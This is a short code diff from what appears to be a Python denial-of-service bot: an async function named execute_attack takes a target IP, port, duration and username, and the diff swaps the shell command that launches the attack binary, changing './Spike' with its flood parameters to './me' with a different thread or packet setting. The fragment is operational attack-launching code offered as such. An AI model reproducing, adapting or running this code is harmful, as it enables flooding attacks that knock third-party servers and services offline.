@@ -280,7 +280,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 16 900",
+            f"./me {ip} {port} {duration} 1200",
             stderr=asyncio.subprocess.PIPE
         )
 
